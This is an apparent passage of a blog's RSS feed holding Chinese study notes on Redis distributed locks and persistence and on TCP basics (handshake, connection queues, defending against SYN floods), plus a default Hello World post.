&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">line&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">reader&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ReadBytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sc">&amp;#39;\n&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// now line is &amp;#34;0 32 4 3 5&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">var&lt;/span> &lt;span class="nx">tmp&lt;/span> &lt;span class="p">[]&lt;/span>&lt;span class="kt">int&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">v&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">strings&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Fields&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">string&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">line&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="c1">// split line by space
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="nx">vv&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">_&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">strconv&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Atoi&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">tmp&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">tmp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">vv&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">vs&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">vs&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">tmp&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="nx">io&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">EOF&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>Redis 八股</title><link>https://resyon.netlify.app/p/redis-%E5%85%AB%E8%82%A1/</link><pubDate>Sun, 06 Mar 2022 15:45:12 +0800</pubDate><guid>https://resyon.netlify.app/p/redis-%E5%85%AB%E8%82%A1/</guid><description>&lt;h1 id="redis-总结">Redis 总结&lt;/h1>
&lt;h2 id="redis-对象系统">Redis 对象系统&lt;/h2>
&lt;ol>
&lt;li>便于实现内存回收。为 &lt;code>C&lt;/code> 这种没有 &lt;code>GC&lt;/code> 的语言实现了基于 ***** 引用计数 ** 的垃圾回收&lt;/li>
&lt;li>对象共享。多个相同的键可以共享同一块内存空间，节约资源&lt;/li>
&lt;/ol>
&lt;p>Redis 只对包含整数的字符串进行共享，主要原因在于共享其余更复杂的对象，在缓存的对象池中验证的成本过高，节省的少量空间不抵 CPU 消耗，实际仍是时间和空间的权衡&lt;/p>
&lt;h2 id="redis-持久化">Redis 持久化&lt;/h2>
&lt;blockquote>
&lt;p>&lt;strong>Redis 状态&lt;/strong> 指 Redis 中非空的数据库 及 其中的键值对&lt;/p>
&lt;/blockquote>
&lt;p>持久化是指 保存和恢复 Redis 状态
主要有 AOF, RDB 两种&lt;/p>
&lt;h3 id="载入">载入&lt;/h3>
&lt;p>没有专门的命令用于载入 &lt;code>AOF&lt;/code> &lt;code>RDB&lt;/code> 文件，Redis 会在启动时自动载入，并且 &lt;strong>优先&lt;/strong> 载入 AOF 文件（AOF 的更新相对频繁些，丢失的键值对相对较少）&lt;/p>
&lt;h2 id="redis-分布式锁">Redis 分布式锁&lt;/h2>
&lt;h3 id="定义">定义&lt;/h3>
&lt;p>分布式锁是控制分布式系统或不同系统之间共同访问共享资源的一种锁实现.&lt;/p>
&lt;h3 id="特征">特征&lt;/h3>
&lt;ul>
&lt;li>互斥&lt;/li>
&lt;li>超时释放. 便面死锁&lt;/li>
&lt;li>可重入. 一个线程在持有锁的情况可以对其再次加锁, 防止锁在线程执行完临界区操作之前释放&lt;/li>
&lt;li>高性能, 高可用, 低开销&lt;/li>
&lt;/ul>
&lt;h3 id="单机分布式锁">单机分布式锁&lt;/h3>
&lt;h4 id="10-setnx">1.0 SETNX&lt;/h4>
&lt;p>&lt;strong>使用&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">SETNX ${key} ${value}
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">EXPIRE ${key} ${time_in_second}
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">do sth
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DEL ${key}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>原理&lt;/strong>: &lt;code>SETNX&lt;/code>: &lt;code>key&lt;/code> 不存在则设置, 否则不做任何动作&lt;/p>
&lt;p>&lt;strong>优点&lt;/strong>: 简单
&lt;strong>缺点&lt;/strong>: &lt;code>SETNX&lt;/code>, &lt;code>EXPIRE&lt;/code> 两条指令实现超时删除, 不为原子操作, 若在两条指令间发生意外, 将死锁&lt;/p>
&lt;h4 id="v20-扩展-set">v2.0 扩展 SET&lt;/h4>
&lt;p>&lt;strong>使用&lt;/strong>:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">SET ${key} ${value} NX EX ${expire_time_in_second}
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">do sth
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DEL ${key}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>原理&lt;/strong>: 同 &lt;code>SETNX&lt;/code>, 但设置值和设置超时两个动作为原子操作&lt;/p>
&lt;p>&lt;strong>问题&lt;/strong>:&lt;/p>
&lt;ol>
&lt;li>提前释放: A 执行过程中, 超时, 键被删除, B 成功获得锁&lt;/li>
&lt;li>误删: 上一过程中的 A 执行完成后, 仍然删除键, 导致 B 获得的锁被误删&lt;/li>
&lt;/ol>
&lt;h4 id="v21-删除安全的-set">v2.1 删除安全的 SET&lt;/h4>
&lt;p>&lt;strong>解决&lt;/strong>:&lt;/p>
&lt;ol>
&lt;li>避免在耗时过长的操作中使用分布式锁; 使用 &lt;code>Redisson&lt;/code> 续命&lt;/li>
&lt;li>将值设置为随机数, 释放锁时检查&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>使用&lt;/strong>:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">SET ${key} ${random_value} NX EX ${expire_time_in_second}
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">do sth
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">check_key_valid &amp;amp;&amp;amp; DEL ${key}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>问题&lt;/strong>: &lt;code>check_key_valid&lt;/code> &amp;amp;&amp;amp; &lt;code>DEL ${key}&lt;/code> 不为原子操作&lt;/p>
&lt;h4 id="v22-删除安全的-set">v2.2 删除安全的 SET&lt;/h4>
&lt;p>使用 &lt;code>LUA&lt;/code> 脚本, 使其原子执行得到保证, (&lt;code>EVAL&lt;/code>)&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-lua" data-lang="lua">&lt;span class="line">&lt;span class="cl">&lt;span class="kr">if&lt;/span> &lt;span class="n">redis.call&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;get&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">KEYS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">ARGV&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="kr">then&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">return&lt;/span> &lt;span class="n">redis.call&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;del&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">KEYS&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">])&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">else&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">return&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">end&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h4 id="v30-带-redisson-的分布式锁">v3.0 带 &lt;code>Redisson&lt;/code> 的分布式锁&lt;/h4>
&lt;p>&lt;strong>目的&lt;/strong>: 解决锁被提前释放的问题&lt;/p>
&lt;p>&lt;strong>原理&lt;/strong>: 利用锁的可重入特性, 让获得锁的线程开启一个定时器的守护进程, 每 &lt;code>expireTime/3&lt;/code> 执行一次, 检查该线程的锁是否存在, 存在则重新设置为 &lt;code>expireTime&lt;/code> 续命, 防止锁由于过期提前释放&lt;/p>
&lt;h3 id="多机分布式锁-redlock">多机分布式锁 &lt;code>Redlock&lt;/code>&lt;/h3>
&lt;h2 id="ref">ref&lt;/h2>
&lt;ul>
&lt;li>《Redis 设计与实现》&lt;/li>
&lt;li>&lt;a class="link" href="https://www.infoq.cn/article/dvaaj71f4fbqsxmgvdce" target="_blank" rel="noopener"
>浅析 Redis 分布式锁解决方案&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>Hello World</title><link>https://resyon.netlify.app/p/hello-world/</link><pubDate>Sun, 06 Mar 2022 00:00:00 +0000</pubDate><guid>https://resyon.netlify.app/p/hello-world/</guid><description>&lt;img src="https://resyon.netlify.app/p/hello-world/cover.jpg" alt="Featured image of post Hello World" />&lt;p>Welcome to Hugo theme Stack. This is your first post. Edit or delete it, then start writing!&lt;/p>
&lt;p>For more information about this theme, check the documentation: &lt;a class="link" href="https://docs.stack.jimmycai.com/" target="_blank" rel="noopener"
>https://docs.stack.jimmycai.com/&lt;/a>&lt;/p>
&lt;p>Want a site like this? Check out &lt;a class="link" href="https://github.com/CaiJimmy/hugo-theme-stack-starter" target="_blank" rel="noopener"
>hugo-theme-stack-stater&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>Photo by &lt;a class="link" href="https://unsplash.com/@pawel_czerwinski" target="_blank" rel="noopener"
>Pawel Czerwinski&lt;/a> on &lt;a class="link" href="https://unsplash.com/" target="_blank" rel="noopener"
>Unsplash&lt;/a>&lt;/p>
&lt;/blockquote></description></item><item><title>Network Summary</title><link>https://resyon.netlify.app/p/network-summary/</link><pubDate>Sun, 20 Feb 2022 13:01:00 +0800</pubDate><guid>https://resyon.netlify.app/p/network-summary/</guid><description>&lt;h1 id="计网">计网&lt;/h1>
&lt;h2 id="tcp">TCP&lt;/h2>
&lt;h3 id="说一下-tcp">说一下 &lt;code>TCP&lt;/code>&lt;/h3>
&lt;p>&lt;code>TCP&lt;/code> 是位于运输层的协议，为应用层提供 &lt;strong>面向连接的&lt;/strong>，&lt;strong>可靠的&lt;/strong> &lt;strong>字节流&lt;/strong> 服务&lt;/p>
&lt;p>面向连接：一定是「一对一」才能连接，不能像 UDP 协议 可以一个主机同时向多个主机发送消息，也就是一对多是无法做到的；&lt;/p>
&lt;p>可靠的：无论的网络链路中出现了怎样的链路变化，TCP 都可以保证一个报文一定能够到达接收端；&lt;/p>
&lt;p>字节流：消息是「没有边界」的，所以无论我们消息有多大都可以进行传输。并且消息是「有序的」，当「前一个」消息没有收到的时候，即使它先收到了后面的字节已经收到，那么也不能扔给应用层去处理，同时对「重复」的报文会自动丢弃。&lt;/p>
&lt;h3 id="tcp-连接">&lt;code>TCP&lt;/code> 连接&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">Connections:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The reliability and flow control mechanisms described above require that TCPs initialize and maintain certain status information for each data stream.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">The combination of this information, including sockets, sequence numbers, and window sizes, is called a connection.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>简单来说就是，用于保证 &lt;strong>可靠性和流量控制维护的某些状态信息&lt;/strong>，这些信息的组合，包括Socket、序列号和窗口大小称为连接。&lt;/p>
&lt;p>（源地址，源端口，目的地址，目的端口）4 元组可以唯一确定 1 个连接&lt;/p>
&lt;h3 id="tcp-与-udp-的区别">&lt;code>TCP&lt;/code> 与 &lt;code>UDP&lt;/code> 的区别&lt;/h3>
&lt;h4 id="连接">连接&lt;/h4>
&lt;p>TCP 是面向连接的传输层协议，传输数据前先要建立连接。&lt;/p>
&lt;p>UDP 是不需要连接，即刻传输数据。&lt;/p>
&lt;h4 id="服务对象">服务对象&lt;/h4>
&lt;p>TCP 是一对一的两点服务，即一条连接只有两个端点。&lt;/p>
&lt;p>UDP 支持一对一、一对多、多对多的交互通信&lt;/p>
&lt;h4 id="可靠性">可靠性&lt;/h4>
&lt;p>TCP 是可靠交付数据的，数据可以无差错、不丢失、不重复、按需到达。&lt;/p>
&lt;p>UDP 是尽最大努力交付，不保证可靠交付数据。&lt;/p>
&lt;h4 id="拥塞控制流量控制">拥塞控制、流量控制&lt;/h4>
&lt;p>TCP 有拥塞控制和流量控制机制，保证数据传输的安全性。&lt;/p>
&lt;p>UDP 则没有，即使网络非常拥堵了，也不会影响 UDP 的发送速率。&lt;/p>
&lt;h4 id="首部开销">首部开销&lt;/h4>
&lt;p>TCP 首部长度较长，会有一定的开销，首部在没有使用「选项」字段时是 20 个字节，如果使用了「选项」字段则会变长的。&lt;/p>
&lt;p>UDP 首部只有 8 个字节，并且是固定不变的，开销较小。&lt;/p>
&lt;h4 id="分段">分段&lt;/h4>
&lt;p>TCP 对应用层传来的数据包进行分段，UDP 则不做处理&lt;/p>
&lt;blockquote>
&lt;p>为什么 IP 有分片，TCP 还要进行分段
&lt;img src="https://resyon.netlify.app/img/8.png"
loading="lazy"
alt="图源: https://www.imperva.com/blog/mtu-mss-explained/"
>&lt;/p>
&lt;/blockquote>
&lt;p>为了保证 &lt;strong>传输效能&lt;/strong>，也方便重传&lt;/p>
&lt;p>为了达到最佳的传输效能 TCP 协议在建立连接的时候通常要协商双方的 MSS 值，使 &lt;code>MSS + IP首部 &amp;lt;= MTU&lt;/code>，确保单个 TCP 报文段无需再经过 IP 层进一步分片。这样，如果一个 TCP 分片丢失，进行重发时也是以 MSS 为单位，而不用重传所有的分片，大大增加了重传的效率&lt;/p>
&lt;h3 id="tcp-如何保证-可靠-传输">&lt;code>TCP&lt;/code> 如何保证 &lt;strong>可靠&lt;/strong> 传输&lt;/h3>
&lt;ol>
&lt;li>确认应答，自适应的超时及重传策略确保不丢包&lt;/li>
&lt;li>首部校验和确保不接收差错报文&lt;/li>
&lt;li>序列号使得 &lt;code>TCP&lt;/code> 能够通过重排序确保报文段不失序，不冗余&lt;/li>
&lt;li>流量控制确保缓冲区不溢出&lt;/li>
&lt;/ol>
&lt;h3 id="tcp-3-次握手">&lt;code>TCP&lt;/code> 3 次握手&lt;/h3>
&lt;h4 id="过程">过程&lt;/h4>
&lt;blockquote>
&lt;p>&lt;a class="link" href="http://blog-img.coolsen./img/image-20210520161056918.png" target="_blank" rel="noopener"
>原图 url&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://resyon.netlify.app/img/4.png"
loading="lazy"
alt="tcp3 次握手"
>&lt;/p>
&lt;ol>
&lt;li>客户端将 &lt;code>SYN&lt;/code> 置为 1 ，随机产生一个 &lt;code>seq=i&lt;/code>，并将数据包发送给服务器，客户端进入 &lt;code>SYN_SENT&lt;/code> 状态，等待服务器确认。&lt;/li>
&lt;li>服务器收到数据包后，由 &lt;code>SYN&lt;/code> 为 1 知道客户端请求建立连接，将 &lt;code>SYN&lt;/code> 和 &lt;code>ACK&lt;/code> 置为1，&lt;code>ack=i+1&lt;/code>，随机产生 &lt;code>seq=j&lt;/code>，并将数据包发送给客户端以确认连接请求。服务器进入 &lt;code>SYN_RCVD&lt;/code> 状态。&lt;/li>
&lt;li>客户端收到确认后，检查 &lt;code>ack&lt;/code> 是否为 &lt;code>i+1&lt;/code>，&lt;code>ACK&lt;/code> 是否为 1，如果正确将 &lt;code>ACK=1&lt;/code>，&lt;code>ack&lt;/code> 置为 &lt;code>j+1&lt;/code>，并将数据包发送给服务器，服务器检查 &lt;code>ack&lt;/code> 是否为 &lt;code>j+1&lt;/code>，&lt;code>ACK=1&lt;/code>，如果正确则连接建立成功，双方进入 &lt;code>ESTABLISHED&lt;/code> 状态，完成三次握手。&lt;/li>
&lt;/ol>
&lt;h4 id="原因为什么要-3-次握手">原因（为什么要 3 次握手）&lt;/h4>
&lt;h5 id="为什么不是两次">为什么不是两次？&lt;/h5>
&lt;ol>
&lt;li>
&lt;p>首要原因是为了防止旧的重复连接初始化造成混乱。&lt;/p>
&lt;p>&lt;img src="https://resyon.netlify.app/img/5.jpg"
loading="lazy"
alt="过期 SYN 干扰"
>&lt;/p>
&lt;p>在双方两次握手即可建立连接的情况下，假设客户端发送 A 报文段请求建立连接，由于网络原因造成 A 暂时无法到达服务器，服务器接收不到请求报文段就不会返回确认报文段。&lt;/p>
&lt;p>客户端在长时间得不到应答的情况下重新发送请求报文段 B，这次 B 顺利到达服务器，服务器随即返回确认报文并进入 ESTABLISHED 状态，客户端在收到 确认报文后也进入 ESTABLISHED 状态，双方建立连接并传输数据，之后正常断开连接。&lt;/p>
&lt;p>此时姗姗来迟的 A 报文段才到达服务器，服务器随即返回确认报文并进入 ESTABLISHED 状态，但是已经进入 CLOSED 状态的客户端无法再接受确认报文段，更无法进入 ESTABLISHED 状态，这将导致服务器长时间单方面等待，造成资源浪费。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>三次握手才能让双方均确认自己和对方的发送和接收能力都正常（有能力建立全双工连接）。2 次握手，如果客户端的 SYN 阻塞了，重复发送多次 SYN 报文，那么服务器在收到请求后就会建立多个冗余的无效链接，造成不必要的资源浪费。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://resyon.netlify.app/img/6.jpg"
loading="lazy"
alt="2 次握手, SYN 阻塞造成的资源浪费"
>&lt;/p>
&lt;p>第一次握手：客户端只是发送处请求报文段，什么都无法确认，而服务器可以确认自己的接收能力和对方的发送能力正常；&lt;/p>
&lt;p>第二次握手：客户端可以确认自己发送能力和接收能力正常，对方发送能力和接收能力正常；&lt;/p>
&lt;p>第三次握手：服务器可以确认自己发送能力和接收能力正常，对方发送能力和接收能力正常；&lt;/p>
&lt;p>可见三次握手才能让双方都确认自己和对方的发送和接收能力全部正常，这样就可以愉快地进行通信了。&lt;/p>
&lt;ol start="3">
&lt;li>
&lt;p>告知对方自己的初始序号值，并确认收到对方的初始序号值。（同步 &lt;code>seq&lt;/code>）&lt;/p>
&lt;p>TCP 实现了可靠的数据传输，原因之一就是 TCP 报文段中维护了序号字段和确认序号字段，通过这两个字段双方都可以知道在自己发出的数据中，哪些是已经被对方确认接收的。这两个字段的值会在初始序号值得基础递增，如果是两次握手，只有发起方的初始序号可以得到确认，而另一方的初始序号则得不到确认。&lt;/p>
&lt;/li>
&lt;/ol>
&lt;h5 id="为什么不是-4-次">为什么不是 4 次&lt;/h5>
&lt;p>&lt;img src="https://resyon.netlify.app/img/7.jpg"
loading="lazy"
alt="4 次握手"
>&lt;/p>
&lt;p>没有必要。因为三次握手已经可以确认双方的发送接收能力正常，双方都知道彼此已经准备好，而且也可以完成对双方初始序号值得确认，也就无需再第四次握手了。&lt;/p>
&lt;h3 id="半连接队列sync-全连接队列backlog-积压值-backlog">半连接队列(&lt;code>sync&lt;/code>) 全连接队列(&lt;code>backlog&lt;/code>) 积压值 (&lt;code>backlog&lt;/code>)&lt;/h3>
&lt;blockquote>
&lt;p>&lt;a class="link" href="https://www.bilibili.com/video/BV1AK4y177WA" target="_blank" rel="noopener"
>https://www.bilibili.com/video/BV1AK4y177WA&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;h4 id="作用">作用&lt;/h4>
&lt;p>&lt;img src="https://resyon.netlify.app/img/3.png"
loading="lazy"
alt="连接队列"
>&lt;/p>
&lt;p>&lt;code>TCP&lt;/code> 完成 3 次握手建立连接后，放入连接队列，这个队列的长度称为 &lt;code>backlog&lt;/code>，取值范围 [0, 5]，通常为 5&lt;/p>
&lt;p>积压值说明的是 TCP 监听的端点已被 TCP 接受而等待应用层接受的最大连接数，对系统所允许的最大连接数或者并发服务器所能并发处理的客户数无影响&lt;/p>
&lt;h4 id="accept-queue满了之后的协议栈处理">accept queue满了之后的协议栈处理&lt;/h4>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat /proc/sys/net/ipv4/tcp_abort_on_overflow
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>有效值:0或者1
0: 当 &lt;code>TCP&lt;/code> 建立连接的 3 路握手完成后，将连接置入 &lt;code>ESTABLISHED&lt;/code> 状态并交付给应用程序的 &lt;code>backlog&lt;/code> 队列时，会检查 &lt;code>backlog&lt;/code> 队列是否已满。若已满，通常行为是将连接还原至 &lt;code>SYN_ACK&lt;/code> 状态，以造成 3 路握手最后的 &lt;code>ACK&lt;/code> 包意外丢失假象――这样在客户端等待超时后可重发 &lt;code>AcK&lt;/code> —―以再次尝试进入 &lt;code>ESTABLISHED&lt;/code> 状态――作为一种修复/重试机制。&lt;/p>
&lt;p>1: 如果 &lt;code>tcp _abort_on_overflow&lt;/code> 为 1，则在检查到 &lt;code>backlog&lt;/code> 队列已满时，直接发 &lt;code>RST&lt;/code> 包给客户端终止此连接&amp;ndash;此时客户端程序会收到 &lt;code>104 Connection reset by pee&lt;/code> r错误&lt;/p>
&lt;h3 id="syn-攻击">&lt;code>SYN&lt;/code> 攻击&lt;/h3>
&lt;h4 id="原理">原理&lt;/h4>
&lt;p>攻击者短时间内伪造不同 &lt;code>IP&lt;/code> 的 &lt;code>SYN&lt;/code> 报文，服务端回之 &lt;code>ACK + SYN&lt;/code> 并进入 &lt;code>SYN_RCVD&lt;/code> 状态，由于没有收到 &lt;code>ACK&lt;/code> 的确认连接，长期停滞在 &lt;code>SYN_RCVD&lt;/code> 状态，最终占满半连接队列，使得服务器不能为正常用户服务&lt;/p>
&lt;h4 id="避免">避免&lt;/h4>
&lt;ol>
&lt;li>通过修改内核参数，调整 &lt;strong>队列大小&lt;/strong> 和 &lt;strong>队列满时的行为&lt;/strong>&lt;/li>
&lt;/ol>
&lt;blockquote>
&lt;p>&lt;a class="link" href="./os.md" >如何修改内核参数 ? &lt;/a>&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-conf" data-lang="conf">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># 缓存网卡至内核数据包的队列大小
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">&lt;/span>&lt;span class="nv">net.core.netdev_max_backlog&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># 半连接队列的大小，限制处于 `SYN_RCVD` 状态的连接数目
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">&lt;/span>&lt;span class="nv">net.ipv4.tcp_max_syn_backlog&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># 对超出处理能力的 SYN 回复 RST
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">&lt;/span>&lt;span class="nv">net.ipv4.tcp_abort_on_overflow&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="2">
&lt;li>&lt;code>tcp_syncookies&lt;/code>&lt;/li>
&lt;/ol>
&lt;p>原理&lt;/p>
&lt;p>&lt;img src="https://resyon.netlify.app/img/9.jpg"
loading="lazy"
alt="tcp_syn_cookies"
>&lt;/p>
